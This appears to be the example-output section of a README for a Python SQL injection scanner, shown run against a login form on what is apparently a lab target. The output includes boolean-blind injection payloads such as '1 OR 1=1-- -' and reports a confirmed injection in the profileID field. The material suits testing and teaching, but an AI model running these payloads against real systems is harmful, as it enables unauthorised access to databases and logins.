## Example output

```shell
root@kali:~# python sql.py -u http://10.113.153.126:5000/sesqli1/login?next=http://10.113.153.126:5000/sesqli1/home

      ███████╗ ██████╗ ██╗     ███╗   ███╗ █████╗  ██████╗ 
      ██╔════╝██╔═══██╗██║     ████╗ ████║██╔══██╗██╔═══██╗
      ███████╗██║   ██║██║     ██╔████╔██║███████║██║   ██║
      ╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██╔══██║██║   ██║
      ███████║╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║╚██████╔╝
      ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝

             [ SQL INJECTION DETECTOR ]

       > SELECT * FROM sanity;
       > ERROR: sanity not found

       [*] Testing parameters...

[i] Mode: AWARE — AND first [STATE-TOUCH], OR fallback [STATE-CHANGE] with warnings

[*] Discovered 1 form(s):

    [0] GET http://10.113.153.126:5000/sesqli1/login  (login-like)
        fields: profileID, password

> SELECT * FROM sanity;
> ERROR: sanity not found

────────────────────────────────────────────────────────
 GET http://10.113.153.126:5000/sesqli1/login
────────────────────────────────────────────────────────
[*] Baseline : 200, 4209b, 0.01s


[*] Testing field: profileID
    [-] Error-based : no DB error signature triggered
    [+] [STATE-CHANGE] Boolean-blind SQLi found [numeric] — confirm
        baseline=4209b  true=4871b  false=4525b
        true    : '1 OR 1=1-- -'
        false   : '1 OR 1=2-- -'
        [!] WARNING: OR payload — may have altered session state
    [-] Time-based : no AND IF()-based delay confirmed
    [+] Works here.
    [>>>] VERDICT : Boolean-blind SQL Injection [[STATE-CHANGE]]
                   numeric, confirm (4871b vs 4525b)

[*] Testing field: password
    [-] Error-based : no DB error signature triggered
    [-] Boolean-blind : no AND/OR response difference across any tested context
    [-] Time-based : no AND IF()-based delay confirmed
    [!] Oh, come on.

========================================================
[*] Summary
========================================================
    [+] http://10.113.153.126:5000/sesqli1/login :: field:profileID
        Boolean-blind [[STATE-CHANGE]] — numeric, confirm (4871b vs 4525b)
```
